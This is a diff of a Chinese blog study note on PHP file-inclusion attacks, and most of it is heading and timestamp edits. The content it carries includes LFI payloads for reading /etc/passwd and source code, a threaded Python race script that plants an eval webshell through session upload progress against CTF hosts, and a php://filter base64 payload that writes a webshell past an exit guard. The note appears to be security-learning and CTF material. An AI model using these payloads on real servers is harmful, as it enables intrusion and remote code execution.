@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20260124005902759.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/01/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20260124005910963.png">
 <meta property="article:published_time" content="2026-01-23T16:48:33.000Z">
-<meta property="article:modified_time" content="2026-06-03T06:28:51.124Z">
+<meta property="article:modified_time" content="2026-06-07T16:22:28.344Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary_large_image">
@@ -362,7 +362,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.9k 字
+          2.8k 字
         
       </span>
     
@@ -373,7 +373,7 @@
         
         
         
-          25 分钟
+          24 分钟
         
       </span>
     
@@ -428,7 +428,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-06-03T14:28:51+08:00
+                    本文最后更新于 2026-06-08T00:22:28+08:00
                   
                   
 
@@ -458,29 +458,16 @@
 <p>Windows系统</p>
 <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\boot.ini：查看系统版本<br><br><span class="hljs-symbol">C:</span>\ProgramFiles\mysql\my.ini：Mysql配置  <br></code></pre></td></tr></table></figure>
 
-<h3 id="利用pearcmd-php本地文件包含"><a href="#利用pearcmd-php本地文件包含" class="headerlink" title="利用pearcmd.php本地文件包含"></a>利用pearcmd.php本地文件包含</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
-<li>安装了pear扩展</li>
-<li>php开启了<code>register_argc_argv</code>选项</li>
-</ul>
-<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>pearcmd.php是一个脚本，pear作为php的一个命令行扩展管理工具，默认安安装路径**&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php**，如果存在文件包含漏洞，就可以运行</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">pear<br><br>或者<br><br>php <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php/pearcmd.php<br></code></pre></td></tr></table></figure>
-
-
-
 <h2 id="LFI漏洞利用技巧"><a href="#LFI漏洞利用技巧" class="headerlink" title="LFI漏洞利用技巧"></a>LFI漏洞利用技巧</h2><p>利用条件</p>
 <ul>
 <li>include()等函数通过动态变量的方式引入包含文件  </li>
 <li>用户能够控制该动态变量</li>
 </ul>
-<h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?参</span>数名=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure>
+<h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?参</span>数名=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure>
 
+<h3 id="利用伪协议读源码"><a href="#利用伪协议读源码" class="headerlink" title="利用伪协议读源码"></a>利用伪协议读源码</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?参数名=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=config.php<br></code></pre></td></tr></table></figure>
 
-
-<h3 id="2、利用伪协议读源码"><a href="#2、利用伪协议读源码" class="headerlink" title="2、利用伪协议读源码"></a>2、利用伪协议读源码</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?参数名=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=config.php<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="3、与文件上传配合使用"><a href="#3、与文件上传配合使用" class="headerlink" title="3、与文件上传配合使用"></a>3、与文件上传配合使用</h3><h3 id="4、包含Apache日志文件"><a href="#4、包含Apache日志文件" class="headerlink" title="4、包含Apache日志文件"></a>4、包含Apache日志文件</h3><p> 有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。  </p>
+<h3 id="与文件上传配合使用"><a href="#与文件上传配合使用" class="headerlink" title="与文件上传配合使用"></a>与文件上传配合使用</h3><h3 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h3><p> 有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。  </p>
 <p>利用条件</p>
 <ul>
 <li>对日志文件可读</li>
@@ -491,22 +478,21 @@
 <li>一般情况下日志存储目录会被修改，需要读取服务器配置文件（httpd，conf，nginx.conf等）或者根据phpinfo()中的信息来得知</li>
 <li>日志记录的信息都可以被调整，如报错的等级或者内容格式</li>
 </ul>
-<h3 id="5、包含SESSION文件"><a href="#5、包含SESSION文件" class="headerlink" title="5、包含SESSION文件"></a>5、包含SESSION文件</h3><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<h3 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h3><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
 <p>利用条件</p>
 <ul>
 <li>找到Session内的可控变量</li>
 <li>Session文件可读写，并且指定存储路径</li>
 </ul>
 <p>php的session文件的保存路径可以在phpinfo中 session.save_path看到</p>
-<p><strong>Session常见存储路径</strong></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sess_PHPSESSID<br><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sess_PHPSESSID<br><br><span class="hljs-regexp">/tmp/</span>sess_PHPSESSID<br><br><span class="hljs-regexp">/tmp/</span>sessions/sess_PHPSESSID<br></code></pre></td></tr></table></figure>
+<h4 id="Session常见存储路径"><a href="#Session常见存储路径" class="headerlink" title="Session常见存储路径"></a>Session常见存储路径</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sess_PHPSESSID<br><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sess_PHPSESSID<br><br><span class="hljs-regexp">/tmp/</span>sess_PHPSESSID<br><br><span class="hljs-regexp">/tmp/</span>sessions/sess_PHPSESSID<br></code></pre></td></tr></table></figure>
 
 <p>session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到</p>
 <p>脚本用于条件竞争，创建临时文件</p>
 <p>脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>target_url = <span class="hljs-string">&quot;http://node5.anna.nssctf.cn:25514/&quot;</span><br>sessid = <span class="hljs-string">&#x27;exp&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;cat ../../f*&#x27;);&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            target_url,<br>            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;\n\r&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;\n\r&#x27;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;test.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            resp = session.post(<br>                target_url + <span class="hljs-string">&#x27;?QAQ=/tmp/sess_&#x27;</span> + sessid,<br>                data=data,<br>                timeout=<span class="hljs-number">5</span><br>            )<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;test.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;bin&#x27;</span> <span class="hljs-keyword">in</span> resp.text <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;etc&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] SUCCESS:&quot;</span>)<br>                <span class="hljs-built_in">print</span>(resp.text)<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] retry...&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>            threading.Thread(target=write, args=(session,), daemon=<span class="hljs-literal">True</span>).start()<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>            threading.Thread(target=read, args=(session,), daemon=<span class="hljs-literal">True</span>).start()<br>        <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Press Enter to exit...&quot;</span>)<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessid = <span class="hljs-string">&#x27;exp&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        resp = session.post(<span class="hljs-string">&#x27;http://114.66.24.210:31654/include.php&#x27;</span>,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;test.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        resp = session.post(<span class="hljs-string">&#x27;http://114.66.24.210:31654/include.php?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;test.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+++++++++++++]retry&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure>
 
-<h3 id="6、包含临时文件"><a href="#6、包含临时文件" class="headerlink" title="6、包含临时文件"></a>6、包含临时文件</h3><p> php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。  </p>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p> php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。  </p>
 <h1 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h1><p>漏洞利用条件（phpinfo中查看）</p>
 <ul>
 <li>allow_url_incude  on</li>
@@ -531,7 +517,7 @@
 <p>apache服务器日志存放文件位置：**&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log**</p>
 <p>Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息，我们可以访问日志文件得到一些网站信息如访问记录，此时可以尝试在url里写入一句话木马，通常在bp里面修改User-Agent，因为直接在网站上get传参可能会被url编码，然后再用蚁剑连接</p>
 <h2 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h2><p>当可以获取Session文件路径并且Session文件内容可控时，就可以通过包含session文件进行攻击</p>
-<h2 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h2><p><strong>PHP_SESSION_UPLOAD_PROGRESS</strong>开启时</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><strong>PHP_SESSION_UPLOAD_PROGRESS</strong>开启时</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="1）获取Session文件所在位置"><a href="#1）获取Session文件所在位置" class="headerlink" title="1）获取Session文件所在位置"></a>1）获取Session文件所在位置</h4><p>通过phpinfo的信息获取session的存储位置</p>
 <p><img src="/2026/01/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20260124005844358.png" srcset="/img/loading.gif" lazyload alt="image-20260124005844358"></p>
 <p> Linux中Session默认存储在**&#x2F;var&#x2F;lib&#x2F;php&#x2F;session**目录下</p>
@@ -548,7 +534,7 @@
 <li>allow_url_fopen ：off&#x2F;on</li>
 <li>allow_url_include：off&#x2F;on</li>
 </ul>
-<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a><strong>过滤器</strong></h5><h6 id="1）转换过滤器"><a href="#1）转换过滤器" class="headerlink" title="1）转换过滤器"></a><strong>1）转换过滤器</strong></h6><p>作用：对数据流进行编码，通常用来读取文件源码</p>
+<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><h6 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h6><p>作用：对数据流进行编码，通常用来读取文件源码</p>
 <p>常见的转换过滤器</p>
 <ol>
 <li><strong>base64</strong></li>
@@ -565,21 +551,21 @@
 </ol>
 <p><code>convert.iconv.</code>目标编码&#x2F;源编码  例:convert.iconv.UTF-8&#x2F;GBK</p>
 <p><code>convert.iconv.</code>源编码.目标编码  例:convert.iconv.UTF-8.UTF-16</p>
-<h6 id="2）字符串过滤器"><a href="#2）字符串过滤器" class="headerlink" title="2）字符串过滤器"></a><strong>2）字符串过滤器</strong></h6><p>该类通常以string开头，对每个字符都进行同样方式的处理</p>
+<h6 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h6><p>该类通常以string开头，对每个字符都进行同样方式的处理</p>
 <ol>
 <li><code>string.toupper</code>：转为大写</li>
 <li><code>string.tolower</code>：转为小写</li>
 <li><code>string.strip_tags</code>：用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处</li>
 <li><code>string.rot13</code>：字符右移13位</li>
 </ol>
-<h6 id="3）加密过滤器"><a href="#3）加密过滤器" class="headerlink" title="3）加密过滤器"></a><strong>3）加密过滤器</strong></h6><p><code>mcrypt.*/mdecrypt</code>.*：使用MCrypt扩展进行加密&#x2F;解密</p>
-<h6 id="4）压缩过滤器"><a href="#4）压缩过滤器" class="headerlink" title="4）压缩过滤器"></a><strong>4）压缩过滤器</strong></h6><p><code>zlib.deflate</code>：压缩</p>
+<h6 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h6><p><code>mcrypt.*/mdecrypt</code>.*：使用MCrypt扩展进行加密&#x2F;解密</p>
+<h6 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h6><p><code>zlib.deflate</code>：压缩</p>
 <p><code>zlib.inflate</code>：解压</p>
 <h5 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡exit</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<br><span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p> 由于开头一直有一个exit的存在，会使得我们的一句话木马并不会被执行（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）</p>
 <p>file_put_contents函数中，第一个参数是可以使用php伪协议的，所以这里就可以用php:&#x2F;&#x2F;filter伪协议以及各种过滤器</p>
-<h6 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a><strong>base64绕过</strong></h6><p>因为$content开头的死亡代码中包含<code>&lt;?···?&gt;</code>这些字符，而这些字符并不在base64的字符中，所以对其进行base64解码时会忽略掉这些字符，所以最终被解码的字符只有”phpexit”和传入的其他字符</p>
+<h6 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h6><p>因为$content开头的死亡代码中包含<code>&lt;?···?&gt;</code>这些字符，而这些字符并不在base64的字符中，所以对其进行base64解码时会忽略掉这些字符，所以最终被解码的字符只有”phpexit”和传入的其他字符</p>
 <p>“phpexit”一共只有7字符，但是base64算法解码时是4个byte一组，所以需要增加1个a一共8个字符，这样”phpexita”就能被正常解码，而后面我们传入的webshell的base64内容也被正常解码，结果就是<?php exit;?></p>
 <p>然后就可以通过对一句话木马进行base64编码并利用filter伪协议来构造payload</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.base64-decode/</span>resource=文件名&amp;txt=a PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==  <br></code></pre></td></tr></table></figure>
@@ -666,6 +652,13 @@
   <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞学习笔记</a>
   
   
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="category-chain-item">文件包含</a>
+  
+  
+
+  
 
       </span>
     
@@ -709,7 +702,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年6月3日</div>
+          <div>2026年6月8日</div>
         </div>
       
       
